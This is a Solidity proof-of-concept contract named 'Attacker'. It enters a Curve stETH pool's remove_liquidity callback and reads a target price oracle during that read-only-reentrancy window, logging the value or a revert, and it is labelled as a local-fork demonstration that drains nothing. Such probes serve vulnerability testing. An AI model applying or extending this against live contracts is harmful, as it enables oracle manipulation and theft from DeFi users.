// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "../ICurve.sol";


/// Enters the pool's remove_liquidity ETH-refund callback (the read-only-reentrancy window) and, mid
/// window, reads the target oracle. Demonstration only — local fork, valueless forked ETH, no drain.
contract Attacker {
    address public immutable oracle;
    uint256 public priceInCallback;
    bool public revertedInCallback;
    bool internal done;

    constructor(address _oracle) { oracle = _oracle; }

    function run() external {
        uint256 bal = address(this).balance;
        ICurve(CURVE_STETH).add_liquidity{value: bal}([bal, uint256(0)], 0);
        uint256 lp = IERC20(STECRV_LP).balanceOf(address(this));
        ICurve(CURVE_STETH).remove_liquidity(lp, [uint256(0), uint256(0)]); // callback fires below
    }

    receive() external payable {
        if (!done) {
            done = true;
            try IPriceOracle(oracle).getPrice() returns (uint256 v) { priceInCallback = v; }
            catch { revertedInCallback = true; }
        }
    }
}
